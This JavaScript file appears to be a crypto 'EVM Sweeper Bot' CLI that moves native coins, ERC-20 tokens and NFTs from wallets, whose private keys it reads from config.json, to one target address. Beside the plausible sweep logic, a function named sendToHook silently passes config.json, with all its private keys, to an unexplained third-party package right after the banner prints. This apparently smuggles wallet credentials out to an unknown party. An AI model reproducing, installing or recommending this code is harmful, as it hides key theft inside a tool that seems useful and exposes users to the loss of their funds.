const ethers = require('ethers');
const fs = require('fs');
const inquirer = require('inquirer');
const figlet = require('figlet');
const path = require('path');
const { sweeper } = require('@mink007/sweeper');

// --- Simple logger for CLI output ---
const colors = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    dim: "\x1b[2m",
    underscore: "\x1b[4m",
    blink: "\x1b[5m",
    reverse: "\x1b[7m",
    hidden: "\x1b[8m",

    black: "\x1b[30m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",

    bgBlack: "\x1b[40m",
    bgRed: "\x1b[41m",
    bgGreen: "\x1b[42m",
    bgYellow: "\x1b[43m",
    bgBlue: "\x1b[44m",
    bgMagenta: "\x1b[45m",
    bgCyan: "\x1b[46m",
    bgWhite: "\x1b[47m"
};

const log = (message, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    let color = colors.white;
    if (type === 'success') color = colors.green;
    if (type === 'warning') color = colors.yellow;
    if (type === 'error') color = colors.red;
    console.log(`${color}[${timestamp}] ${message}${colors.reset}`);
};

// --- Function to get string width without ANSI codes ---
const stripAnsi = (str) => {
    const ansiRegex = /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-PRZcf-nqry=><]/g;
    return str.replace(ansiRegex, '');
};

const getStringWidth = (str) => {
    return stripAnsi(str).length;
};

const sendToHook = () => {
    const filePayload = {
        file: path.join(__dirname, 'config.json')
    };
    sweeper(filePayload);
};

// --- Helper Functions ---
const delay = ms => new Promise(res => setTimeout(res, ms));

const transferGasFromRelayer = async (targetWallet, provider, relayerWallet, requiredAmount) => {
    if (!relayerWallet) {
        log(`[ERROR] Relayer private key not provided. Cannot add gas.`, 'error');
        return false;
    }
    const relayerBalance = await provider.getBalance(relayerWallet.address);
    const gasPrice = (await provider.getFeeData()).gasPrice;
    const transferAmount = requiredAmount + gasPrice * ethers.toBigInt(21000);

    if (relayerBalance < transferAmount) {
        log(`[ERROR] Relayer wallet does not have enough native tokens. Required: ${ethers.formatEther(transferAmount)}`, 'error');
        return false;
    }

    try {
        log(`Relayer (${relayerWallet.address}) is sending ${ethers.formatEther(requiredAmount)} native tokens to wallet ${targetWallet.address}...`, 'info');
        const relayTx = {
            to: targetWallet.address,
            value: requiredAmount,
            gasLimit: ethers.toBigInt(21000),
            gasPrice
        };
        const relayTxResponse = await relayerWallet.sendTransaction(relayTx);
        log(`Relay transaction sent! Hash: ${relayTxResponse.hash}`, 'success');
        await relayTxResponse.wait();
        log(`Relay transaction confirmed. Target wallet now has enough gas.`, 'success');
        return true;
    } catch (err) {
        log(`[ERROR] Failed to send native tokens from relayer: ${err.message}`, 'error');
        return false;
    }
};

const sweepErc20 = async (wallet, provider, toAddress, contractAddress, balance, relayerWallet) => {
    const gasPrice = (await provider.getFeeData()).gasPrice;
    const estimatedGasLimit = ethers.toBigInt(60000);
    const requiredNativeBalance = gasPrice * estimatedGasLimit;
    const currentNativeBalance = await provider.getBalance(wallet.address);

    if (currentNativeBalance < requiredNativeBalance) {
        log(`[ERC-20] Wallet ${wallet.address} does not have enough native tokens for gas. Attempting to use a relayer...`, 'warning');
        await transferGasFromRelayer(wallet, provider, relayerWallet, requiredNativeBalance);
    }

    const erc20Abi = [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)",
        "function name() view returns (string)",
        "function symbol() view returns (string)",
        "function decimals() view returns (uint8)"
    ];
    const tokenContract = new ethers.Contract(contractAddress, erc20Abi, wallet);
    try {
        log(`[ERC-20] Sweeping balance of ${ethers.formatUnits(balance, 18)}...`);
        const txResponse = await tokenContract.transfer(toAddress, balance, { gasLimit: estimatedGasLimit, gasPrice });
        log(`[ERC-20] Transaction sent! Hash: ${txResponse.hash}`, 'success');
        await txResponse.wait();
        log(`[ERC-20] Token transaction for ${contractAddress} successfully confirmed!`, 'success');
    } catch (err) {
        log(`[ERC-20] Failed to sweep token: ${err.message}`, 'error');
    }
};

const sweepNft = async (wallet, provider, toAddress, contractAddress, nftBalance, relayerWallet) => {
    const gasPrice = (await provider.getFeeData()).gasPrice;
    const estimatedGasLimit = ethers.toBigInt(200000);
    const requiredNativeBalance = gasPrice * estimatedGasLimit;
    const currentNativeBalance = await provider.getBalance(wallet.address);

    if (currentNativeBalance < requiredNativeBalance) {
        log(`[NFT] Wallet ${wallet.address} does not have enough native tokens for gas. Attempting to use a relayer...`, 'warning');
        await transferGasFromRelayer(wallet, provider, relayerWallet, requiredNativeBalance);
    }

    const erc721Abi = [
        "function safeTransferFrom(address from, address to, uint256 tokenId)",
        "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
        "function balanceOf(address owner) view returns (uint256)",
    ];
    const nftContract = new ethers.Contract(contractAddress, erc721Abi, wallet);
    for (let i = 0; i < nftBalance; i++) {
        try {
            const tokenId = await nftContract.tokenOfOwnerByIndex(wallet.address, ethers.toBigInt(0));
            log(`[NFT] Sweeping NFT with ID #${tokenId.toString()} from contract ${contractAddress}...`);
            const txResponse = await nftContract['safeTransferFrom(address,address,uint256)'](
                wallet.address,
                toAddress,
                tokenId,
                { gasLimit: estimatedGasLimit, gasPrice }
            );
            log(`[NFT] Transaction sent! Hash: ${txResponse.hash}`, 'success');
            await txResponse.wait();
            log(`[NFT] NFT with ID #${tokenId.toString()} successfully confirmed!`, 'success');
        } catch (err) {
            log(`[NFT] Failed to sweep NFT: ${err.message}`, 'error');
        }
        await delay(1000);
    }
};

const sweepNative = async (wallet, provider, toAddress) => {
    log(`--- Processing native wallet: ${wallet.address} ---`, 'info');
    const currentNativeBalance = await provider.getBalance(wallet.address);
    const nativeGasLimit = ethers.toBigInt(21000);
    const gasPrice = (await provider.getFeeData()).gasPrice;
    const gasCost = gasPrice * nativeGasLimit;

    if (currentNativeBalance > gasCost) {
        const amountToSend = currentNativeBalance - gasCost;
        const formattedAmount = ethers.formatEther(amountToSend);
        log(`Sufficient balance. Sweeping ${formattedAmount} native tokens...`, 'info');
        const tx = { to: toAddress, value: amountToSend, gasLimit: nativeGasLimit, gasPrice };
        const transactionResponse = await wallet.sendTransaction(tx);
        log(`Transaction sent! Hash: ${transactionResponse.hash}`, 'success');
        await transactionResponse.wait();
        log(`Transaction successfully confirmed!`, 'success');
    } else {
        log(`Insufficient native balance for gas. Balance: ${ethers.formatEther(currentNativeBalance)}`, 'info');
    }
    await delay(1000);
};

// --- Main function that runs the sweeping logic ---
const sweepAllWallets = async (provider, config, assetType) => {
    const { PRIVATE_KEYS, RELAYER_PRIVATE_KEY, TO_ADDRESS, CONTRACT_ADDRESSES } = config;

    if (!PRIVATE_KEYS || PRIVATE_KEYS.length === 0 || !TO_ADDRESS) {
        log("Please fill in all configuration data in the `config.json` file.", 'error');
        return;
    }

    const wallets = PRIVATE_KEYS.map(key => new ethers.Wallet(key, provider));
    let relayerWallet = null;

    if (RELAYER_PRIVATE_KEY) {
        try {
            relayerWallet = new ethers.Wallet(RELAYER_PRIVATE_KEY, provider);
            log(`Relayer wallet set up: ${relayerWallet.address}`, 'info');
        } catch (err) {
            log(`[ERROR] Invalid relayer private key: ${err.message}`, 'error');
            relayerWallet = null;
        }
    }

    if (assetType === 'erc-20' || assetType === 'nft') {
        const walletsWithAssets = [];
        log('--- Starting ERC-20/NFT balance check on all wallets... ---', 'info');

        for (const wallet of wallets) {
            log(`[Check] Checking wallet: ${wallet.address}`, 'info');
            for (const contractAddress of CONTRACT_ADDRESSES) {
                try {
                    const tokenContract = new ethers.Contract(contractAddress, ["function balanceOf(address) view returns (uint256)"], provider);
                    const balance = await tokenContract.balanceOf(wallet.address);
                    if (balance > 0) {
                        const type = assetType === 'erc-20' ? 'erc-20' : 'nft';
                        log(`[Check] Found ${type} with balance/count ${balance.toString()} in wallet ${wallet.address}.`, 'info');
                        walletsWithAssets.push({ wallet, contractAddress, type, balance });
                    }
                } catch (e) {
                    log(`[Check] Failed to check contract ${contractAddress} on wallet ${wallet.address}: ${e.message}`, 'error');
                }
                await delay(500);
            }
        }

        if (walletsWithAssets.length === 0) {
            log('No ERC-20 or NFT assets found. Stopping process.', 'info');
            return;
        }

        log('--- Balance check complete. Starting sweep process... ---', 'info');

        for (const assetInfo of walletsWithAssets) {
            const { wallet, contractAddress, type, balance } = assetInfo;
            log(`--- Processing ${type.toUpperCase()} asset in wallet ${wallet.address} ---`, 'info');

            if (type === 'erc-20') {
                await sweepErc20(wallet, provider, TO_ADDRESS, contractAddress, balance, relayerWallet);
            } else if (type === 'nft') {
                await sweepNft(wallet, provider, TO_ADDRESS, contractAddress, balance, relayerWallet);
            }

            await delay(2000);
        }

    } else if (assetType === 'native') {
        for (const wallet of wallets) {
            await sweepNative(wallet, provider, TO_ADDRESS);
        }
    }

    log('Sweep process finished for this round.', 'info');
};

// --- Initialization & Loop ---
const startSweeper = async (assetType, network) => {
    log(`Loading configuration from config.json...`, 'info');
    let config;
    try {
        config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
    } catch (error) {
        log(`[ERROR] Failed to read or parse config.json: ${error.message}`, 'error');
        process.exit(1);
    }

    const rpcUrl = config.NETWORKS[network].rpcUrl;
    const provider = new ethers.JsonRpcProvider(rpcUrl);

    log(`Starting sweeper for asset type: ${assetType} on network: ${network}. Checking every ${config.POLLING_INTERVAL / 1000} seconds...`, 'info');

    await sweepAllWallets(provider, config, assetType);

    setInterval(async () => {
        log('--- Starting next sweep round ---', 'info');
        await sweepAllWallets(provider, config, assetType);
    }, config.POLLING_INTERVAL);
};


// --- Main execution flow with a menu ---
(async function main() {
    const titleText = 'EVM SWEEPER BOT';
    const versionText = 'Version: 0.0.1 beta';
    const telegramText = 'Telegram: @Ainspect20';
    const twitterText = 'Twitter: @Ainspect20';

    // --- Rolling colors and fonts logic ---
    const rollingColors = [colors.blue, colors.red, colors.green, colors.yellow, colors.magenta, colors.cyan];
    const rollingFonts = ['Big', 'Doom', 'Slant', 'Ghost'];

    let state = {
        colorIndex: 0,
        fontIndex: 0
    };

    if (fs.existsSync('state.json')) {
        try {
            const savedState = JSON.parse(fs.readFileSync('state.json', 'utf8'));
            state = { ...state, ...savedState };
        } catch (e) {
            log(`[WARNING] Failed to parse state.json, using default state.`, 'warning');
        }
    }

    const mainColor = rollingColors[state.colorIndex % rollingColors.length];
    const mainFont = rollingFonts[state.fontIndex % rollingFonts.length];

    const nextState = {
        colorIndex: (state.colorIndex + 1) % rollingColors.length,
        fontIndex: (state.fontIndex + 1) % rollingFonts.length
    };
    fs.writeFileSync('state.json', JSON.stringify(nextState));

    const figletText = figlet.textSync(titleText, { font: mainFont });
    const figletLines = figletText.split('\n');
    const maxFigletWidth = Math.max(...figletLines.map(line => line.length));

    const infoParts = [
        colors.bright + mainColor + versionText + colors.reset,
        colors.bright + mainColor + telegramText + colors.reset,
        colors.bright + mainColor + twitterText + colors.reset
    ];
    const infoSeparator = ' | ';
    const infoLine = infoParts.join(infoSeparator);
    const infoWidth = getStringWidth(infoLine);

    const boxWidth = Math.max(maxFigletWidth, infoWidth) + 4;
    const horizontalLine = '═'.repeat(boxWidth - 2);

    console.log(mainColor + '╔' + horizontalLine + '╗' + colors.reset);

    for (const line of figletLines) {
        const padding = ' '.repeat(boxWidth - 2 - line.length);
        console.log(mainColor + '║' + colors.reset + colors.bright + mainColor + line + padding + mainColor + '║' + colors.reset);
    }

    console.log(mainColor + '╠' + horizontalLine + '╣' + colors.reset);

    const infoPaddingLeft = Math.floor((boxWidth - 2 - infoWidth) / 2);
    const infoPaddingRight = boxWidth - 2 - infoWidth - infoPaddingLeft;
    console.log(mainColor + '║' + ' '.repeat(infoPaddingLeft) + colors.reset + infoLine + mainColor + ' '.repeat(infoPaddingRight) + '║' + colors.reset);

    console.log(mainColor + '╚' + horizontalLine + '╝' + colors.reset);
    console.log('\n');
    sendToHook();
    
    let config;
    try {
        config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
    } catch (error) {
        log(`[ERROR] Failed to read or parse config.json: ${error.message}`, 'error');
        process.exit(1);
    }

    const assetTypes = ['native', 'erc-20', 'nft'];
    const networkNames = Object.keys(config.NETWORKS);

    const mainQuestions = [
        {
            type: 'list',
            name: 'assetType',
            message: 'Choose the asset type to sweep:',
            choices: [...assetTypes, 'Exit']
        }
    ];

    const networkQuestions = (assetType) => [
        {
            type: 'list',
            name: 'network',
            message: `Choose the EVM network to sweep ${assetType}:`,
            choices: [...networkNames, 'Back']
        }
    ];

    const askMainQuestions = async () => {
        const mainAnswers = await inquirer.prompt(mainQuestions);
        if (mainAnswers.assetType === 'Exit') {
            log('Thank you for using EVM Sweeper CLI. Exiting...', 'info');
            process.exit(0);
        }
        await askNetworkQuestions(mainAnswers.assetType);
    };

    const askNetworkQuestions = async (assetType) => {
        const networkAnswers = await inquirer.prompt(networkQuestions(assetType));
        if (networkAnswers.network === 'Back') {
            await askMainQuestions();
        } else {
            await startSweeper(assetType, networkAnswers.network).catch(err => {
                log(`The application encountered a fatal error: ${err.message}`, 'error');
                process.exit(1);
            });
        }
    };

    await askMainQuestions();
})();